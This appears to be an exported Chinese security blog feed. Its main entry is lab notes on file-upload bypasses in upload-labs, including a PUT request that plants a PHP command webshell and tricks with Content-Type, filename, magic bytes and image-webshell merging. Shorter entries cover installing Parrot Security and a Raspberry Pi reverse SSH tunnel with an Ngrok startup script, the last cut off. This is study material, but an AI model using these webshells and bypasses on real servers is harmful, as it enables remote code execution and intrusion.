    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>教程看的<a href="https://www.bilibili.com/video/BV1K741147FY">https://www.bilibili.com/video/BV1K741147FY</a>里面的有很多没有说直接绕过了就很烦，但是这个教程内容很丰富。教程里面修改东西的我也不知道什么意思他也不说就很烦，我就自己百度找然后都写到笔记里面了</strong></p>
<p>文件上传绕过思路在这个地方找到<a href="https://www.bilibili.com/read/cv6978946/">https://www.bilibili.com/read/cv6978946/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227112040834.png" alt="image-20201227112040834"></p>
<h1 id="PUT-方法文件上发"><a href="#PUT-方法文件上发" class="headerlink" title="PUT 方法文件上发"></a>PUT 方法文件上发</h1><p>判断目标开没有开启PUT 方法</p>
<p>向指定资源位置上传其最新内容</p>
<h2 id="开启PUT"><a href="#开启PUT" class="headerlink" title="开启PUT"></a>开启PUT</h2><p>打开Apache配置文件<strong>httpd.conf</strong>，在上面添加</p>
<p>找到下面的然后叫注释去掉，加载<code>modules/mod_dav.so</code>和<code>modules/mod_dav_fs.so</code>模块</p>
<p><code>LoadModule</code>加载特定的DSO模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#LoadModule dav_module modules&#x2F;mod_dav.so</span><br><span class="line">#LoadModule dav_fs_module modules&#x2F;mod_dav_fs.so</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224204819759.png" alt="image-20201224204819759"></p>
<p>添加<code>DAV On</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224204845178.png" alt="image-20201224204845178"></p>
<p>在配置文件的最上面添加，<strong>注意一点要最上面</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DavLockDB C:\phpStudy\PHPTutorial\WWW\a</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224205715704.png" alt="image-20201224205715704"></p>
<p>然后重启服务</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224205814859.png" alt="image-20201224205814859"></p>
<h3 id="查看有没有开启PUT请求"><a href="#查看有没有开启PUT请求" class="headerlink" title="查看有没有开启PUT请求"></a>查看有没有开启PUT请求</h3><p>下面查看有什么方法里面是没有写PUT的请求的</p>
<p>在终端输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 服务器ip 端口</span><br></pre></td></tr></table></figure>
<p>然后在输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPTIONS &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host:  服务器的ip</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224211627382.png" alt="image-20201224211627382"></p>
<p>用nc也可以</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224212126057.png" alt="image-20201224212126057"></p>
<h3 id="用PUT请求上发文件"><a href="#用PUT请求上发文件" class="headerlink" title="用PUT请求上发文件"></a>用PUT请求上发文件</h3><p>用burp发起PUT请求上发webshell到/a/a.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;a&#x2F;a.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.160</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">system($_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看见返回的是201</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201225192556437.png" alt="image-20201225192556437"></p>
<p>我们访问执行命令</p>
<p>可以看见执行了命令</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201225193001865.png" alt="image-20201225193001865"></p>
<h1 id="前端检查绕过"><a href="#前端检查绕过" class="headerlink" title="前端检查绕过"></a>前端检查绕过</h1><p>有web服务器，文件上发检查只在前端js来检查，如检查文件后缀名来判断上发的文件</p>
<p><strong>比如upload-labs的第一关</strong></p>
<p>下面是他的源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们直接发送.php文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115337934.png" alt="image-20201224115337934"></p>
<p>看一下页面源代码</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224114822127.png" alt="image-20201224114822127"></p>
<p>他会调用 checkFile()函数</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115024388.png" alt="image-20201224115024388"></p>
<p>我们只需要叫html的调用的标签删除就可以了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115121029.png" alt="image-20201224115121029"></p>
<p>我把他删除</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115144045.png" alt="image-20201224115144045"></p>
<p>然后我们发照片</p>
<p>上传成功</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115220757.png" alt="image-20201224115220757"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201224115234776.png" alt="image-20201224115234776"></p>
<h1 id="修改文件名绕过"><a href="#修改文件名绕过" class="headerlink" title="修改文件名绕过"></a>修改文件名绕过</h1><p><strong>比如upload-labs的第一关</strong></p>
<p>上发一个phpinfo.php文件里面内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们叫.php文件改成.png格式</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181232127.png" alt="image-20201226181232127"></p>
<p>改成png</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181407983.png" alt="image-20201226181407983"></p>
<p>用burp抓一下</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181518539.png" alt="image-20201226181518539"></p>
<p>叫文件名改.php</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181616786.png" alt="image-20201226181616786"></p>
<p>可以看见文件上传成功</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181657727.png" alt="image-20201226181657727"></p>
<p>访问地址</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226181715424.png" alt="image-20201226181715424"></p>
<h1 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h1><p>下面这个照片的括住的就是文件的类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: image&#x2F;png</span><br></pre></td></tr></table></figure>
<p>Content-Type:字段就是指定文件类型的<br><strong>image/png就是png类型的</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226182236835.png" alt="image-20201226182236835"></p>
<p>文件类型可以用<code>mimetype</code>命令来查看</p>
<p>格式 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimetype 要查看的文件名</span><br></pre></td></tr></table></figure>
<p>咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimetype phpinfo.php</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226190032426.png" alt="image-20201226190032426"><br>如果我们叫php文件名改成png用<code>mimetype</code>命令检查还是显示php类型<br>列</p>
<p>下面我叫<strong>phpinfo.php</strong>文件改成<strong>phpinfo.png</strong>文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226190817584.png" alt="image-20201226190817584"></p>
<p>用<code>mimetype</code>来检查</p>
<p>可以看见还是php类型</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226190958336.png" alt="image-20201226190958336"></p>
<p>下面是在百度上找到文件类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*.php  		application&#x2F;x-php</span><br><span class="line">*.gif            image&#x2F;gif    </span><br><span class="line">*.html    text&#x2F;html    </span><br><span class="line">*.jpeg    image&#x2F;jpeg</span><br><span class="line">*.jpg          image&#x2F;jpeg    </span><br><span class="line">*.js       text&#x2F;javascript, application&#x2F;javascript    </span><br><span class="line">*.mp3    audio&#x2F;mpeg    </span><br><span class="line">*.mp4    audio&#x2F;mp4, video&#x2F;mp4    </span><br><span class="line">*.pdf    application&#x2F;pdf    </span><br><span class="line">*.png    image&#x2F;png    </span><br><span class="line">*.ppt    application&#x2F;vnd.ms-powerpoint    </span><br><span class="line">*.txt           text&#x2F;plain    </span><br><span class="line">*.xml    text&#x2F;xml, application&#x2F;xml    </span><br><span class="line">*.zip            aplication&#x2F;zip    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>演示在比如upload-labs的第二关</strong></p>
<p>上发一个phpinfo.php文件里面内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>他就会报文件类型不正确</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226183750686.png" alt="image-20201226183750686"></p>
<p>用burp抓包叫文件名改成png</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226183934420.png" alt="image-20201226183934420"></p>
<p>发现还是文件上传不正确</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184048804.png" alt="image-20201226184048804"></p>
<p>在选择一个php文件上传</p>
<p>用burp抓包，然后我们叫修改文件的类型改成<strong>image/png</strong> 就是<strong>png</strong>类型</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184146860.png" alt="image-20201226184146860"></p>
<p>然后文件上传成功</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184427789.png" alt="image-20201226184427789"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226184443032.png" alt="image-20201226184443032"></p>
<h1 id="修改数据包的内容绕过"><a href="#修改数据包的内容绕过" class="headerlink" title="修改数据包的内容绕过"></a>修改数据包的内容绕过</h1><p>有的过滤会检查文件内容每一个照片里面都有一个前面这个字段来代表文件类型<br>我们抓一个普通的照片上传文件的数据包</p>
<p>可以看见前面有一个PNG的字符串</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226193145015.png" alt="image-20201226193145015"></p>
<p><strong>比如upload-labs的第十四关</strong></p>
<p>上发一个phpinfo.php文件里面内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上发的时候用burp抓包如果叫文件名，和类型给修改成png格式的发现还是发不上去</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201226193531143.png" alt="image-20201226193531143"></p>
<p>然后我们发一个png文件叫里面的文件给文件内容全部给改成webshell只留下照片的内容头的部分</p>
<p>上传一个普通照片文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227084637858.png" alt="image-20201227084637858"></p>
<p>用burp进行抓包</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227084716612.png" alt="image-20201227084716612"></p>
<p>然后我们叫里面改成webshell只留下照片的内容头的部分</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227084821816.png" alt="image-20201227084821816"></p>
<p>放包就上发上去了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227095004893.png" alt="image-20201227095004893"></p>
<p>但是是执行不了的应为他是png文件，可以通过其他的漏洞进行执行比如解析漏洞</p>
<h1 id="将照片和webshell合成绕过"><a href="#将照片和webshell合成绕过" class="headerlink" title="将照片和webshell合成绕过"></a>将照片和webshell合成绕过</h1><p>他会吧一个webshell的木马复制到照片里面，但是这个有一个问题就是当服务器解析照片的时候可能会受到照片的源码的内容应为webshell的运行</p>
<p>用<code>copy</code>命令</p>
<p>我们准备一个文件名叫phpinfo.php</p>
<p>内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>还有一个普通的照片名字zm9kpy.jpg</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227100118849.png" alt="image-20201227100118849"></p>
<p>命令<code>copy /a zm9kpy.jpg + /b phpinfo.php = a.jpg</code></p>
<p>照片顺序不要搞错了不然就叫webshell代码插到最前面了</p>
<p>可以看见生成出来一个a.jpg文件</p>
<p>编辑出来的照片有的可能查看不了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110046213.png" alt="image-20201227110046213"></p>
<p>教程上是这样写的不容易看懂</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227100734663.png" alt="image-20201227100734663"></p>
<p>照片还是可以打开的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110144969.png" alt="image-20201227110144969"></p>
<p>查看照片文件的源代码</p>
<p>可以看见已经插入上面了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110517915.png" alt="image-20201227110517915"></p>
<p><strong>演示在比如upload-labs的第十四关</strong></p>
<p>用这个照片进行上传可以上传上去</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110633221.png" alt="image-20201227110633221"></p>
<p>复制照片的链接照片应为是jpg类型的所以执行不了，可以借用其他的漏洞来实现</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227110938770.png" alt="image-20201227110938770"></p>
<p>我在服务器里面叫这个文件名手动改成php文件看看能不能执行</p>
<p>可以执行</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227111542327.png" alt="image-20201227111542327"></p>
<h1 id="文件幻术头绕过"><a href="#文件幻术头绕过" class="headerlink" title="文件幻术头绕过"></a>文件幻术头绕过</h1><p>同照片的文件内容前几个自己都是相同的下面的16进制是在一个博客上<a href="https://blog.csdn.net/Kevinhanser/article/details/81613003">https://blog.csdn.net/Kevinhanser/article/details/81613003</a>找的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jpg&#x3D;FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">gif&#x3D;47 49 46 38 39 61</span><br><span class="line">png &#x3D; 89 50 4E 47</span><br></pre></td></tr></table></figure>
<p>我用burp抓一个jpg的数据包看一下16进行的头</p>
<p>可以看见是相通的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201227114401188.png" alt="image-20201227114401188"></p>
<p><strong>演示在比如upload-labs的第十四关</strong></p>
<p>看看文件是否能上传上去</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>文件上传漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试系统 Parrot Security  安装教程</title>
    <url>/2019/09/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%B3%BB%E7%BB%9F%20Parrot%20Security%20%20%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>Parrot Security 是这个装逼非常好的一个系统哈哈哈就这样说说。<br>闲话不多说开始正式的安装。<br>和kali安装步骤都一样</p>
<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p> 官方下载<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907153310324.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907153358253.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907153627801.png" alt="在这里插入图片描述">这个我用的这个版本<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907153745630.png" alt="在这里插入图片描述"></p>
<h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907154228995.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907154241183.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907154306507.png" alt="在这里插入图片描述">这个可以叫安装到其他硬盘大的地方<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907154406992.png" alt="在这里插入图片描述"></p>
<p>   这个我喜欢50g<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907154445965.png" alt="在这里插入图片描述">这个cpu是2内存也是2<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019090715452193.png" alt="在这里插入图片描述"></p>
<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907155007180.png" alt="在这里插入图片描述"></p>
<pre><code>这个我选择的是图像的</code></pre>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907155046950.png" alt="在这里插入图片描述"><br>我英语不好我就选择中文的了，你们随便<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907155807986.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907155822240.png" alt="在这里插入图片描述"><br>这个是登陆密码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019090716000343.png" alt="在这里插入图片描述"><br>设置一个普通登陆账号<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907160116570.png" alt="在这里插入图片描述"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907160324613.png" alt="在这里插入图片描述"><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907161201403.png" alt="在这里插入图片描述"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907161215811.png" alt="在这里插入图片描述"><br>这个安装是虚拟机如果是物理机可以设置<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907161307906.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907161326742.png" alt="在这里插入图片描述"></p>
<p>选择    否<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907161357421.png" alt="在这里插入图片描述"></p>
<p>选择    是<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907161423370.png" alt="在这里插入图片描述"></p>
<p>现在是安装系统了，要花的时间<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907161446308.png" alt="在这里插入图片描述"><br>选择  是<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907162857931.png" alt="在这里插入图片描述"><br>选择下面那个<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907162958989.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907163037561.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907163050197.png" alt="在这里插入图片描述"><br>安装完的效果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190907163641783.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派，反向ssh，内网通过公网访问到其他内网</title>
    <url>/2020/08/30/%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%8C%E5%8F%8D%E5%90%91ssh%EF%BC%8C%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E5%88%B0%E5%85%B6%E4%BB%96%E5%86%85%E7%BD%91/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h2 id="简单说"><a href="#简单说" class="headerlink" title="简单说"></a>简单说</h2><p>a内网，b公网，c内网<br>在c内网怎么访问到a的内网里面，就和访问c内网其他主机一样？<br> 我研究了好长时间问过学习过10多年的大佬，还有其他厉害的大佬，其他人给的建议，和书籍还有百度，下面我就进行一下内网穿透，反向隧道，<br> 应为我的笔记本内网穿透没有什么太大的用处 ，可以用花生壳内网穿透很简单。就不多说了<br> 都是树莓派就不行了，如果进行，没有远程ssh就不行了，不能进行渗透测试，<br> 开始操作<br>在《树莓派渗透实战》书说的如果从外网访问内网，是访问不了的，反向ssh隧道从内网就可以做到<br>内网执行的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -fN -R 5555:localhost:22  root@公网ip</span><br></pre></td></tr></table></figure>
<p>服务器执行的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost -p5555</span><br></pre></td></tr></table></figure>
<h2 id="树莓派安装的是kali-linux系统-安装花生壳树莓派，"><a href="#树莓派安装的是kali-linux系统-安装花生壳树莓派，" class="headerlink" title="树莓派安装的是kali linux系统 安装花生壳树莓派，"></a>树莓派安装的是kali linux系统 安装花生壳树莓派，</h2><p>花生壳地址<a href="https://hsk.oray.com/download/">https://hsk.oray.com/download/</a><br>应为树莓派我安装的arm64位的，他只有32位的，安装不上<br>下面命令对32位的支持</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture armhf</span><br></pre></td></tr></table></figure>
<p>反正还是安装不是，不知道怎么回事<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604210928493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<h2 id="树莓派用Sunny-Ngrok内网穿透"><a href="#树莓派用Sunny-Ngrok内网穿透" class="headerlink" title="树莓派用Sunny-Ngrok内网穿透"></a>树莓派用Sunny-Ngrok内网穿透</h2><p>官方<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060421113237.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sunny clientid  隧道id</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604211248679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>自启动<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a>官方说明</p>
<h2 id="1、下载客户端"><a href="#1、下载客户端" class="headerlink" title="1、下载客户端"></a>1、下载客户端</h2><p>这一步就都不用说了大家都知道怎么操作。下载完成之后将客户端执行文件移动到 /use/local/bin 目录下并给予可执行权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv sunny &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br><span class="line">sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br></pre></td></tr></table></figure>
<h2 id="2、编写启动脚本"><a href="#2、编写启动脚本" class="headerlink" title="2、编写启动脚本"></a>2、编写启动脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;init.d&#x2F;sunny 启动脚本代码</span><br></pre></td></tr></table></figure>
<p>把代码里面的【隧道id】替换成自己的隧道id</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh -e</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          ngrok.cc</span><br><span class="line"># Required-Start:    $network $remote_fs $local_fs</span><br><span class="line"># Required-Stop:     $network $remote_fs $local_fs</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: autostartup of frp for Linux</span><br><span class="line">### END INIT INFO</span><br><span class="line"></span><br><span class="line">NAME&#x3D;sunny</span><br><span class="line">DAEMON&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;$NAME</span><br><span class="line">PIDFILE&#x3D;&#x2F;var&#x2F;run&#x2F;$NAME.pid</span><br><span class="line"></span><br><span class="line">[ -x &quot;$DAEMON&quot; ] || exit 0</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">      if [ -f $PIDFILE ]; then</span><br><span class="line">        echo &quot;$NAME already running...&quot;</span><br><span class="line">        echo -e &quot;\033[1;35mStart Fail\033[0m&quot;</span><br><span class="line">      else</span><br><span class="line">        echo &quot;Starting $NAME...&quot;</span><br><span class="line">        start-stop-daemon -S -p $PIDFILE -m -b -o -q -x $DAEMON -- clientid 隧道id || return 2</span><br><span class="line">        echo -e &quot;\033[1;32mStart Success\033[0m&quot;</span><br><span class="line">    fi</span><br><span class="line">    ;;</span><br><span class="line">  stop)</span><br><span class="line">        echo &quot;Stoping $NAME...&quot;</span><br><span class="line">        start-stop-daemon -K -p $PIDFILE -s TERM -o -q || return 2</span><br><span class="line">        rm -rf $PIDFILE</span><br><span class="line">        echo -e &quot;\033[1;32mStop Success\033[0m&quot;</span><br><span class="line">    ;;</span><br><span class="line">  restart)</span><br><span class="line">    $0 stop &amp;&amp; sleep 2 &amp;&amp; $0 start</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    echo &quot;Usage: $0 &#123;start|stop|restart&#125;&quot;</span><br><span class="line">    exit 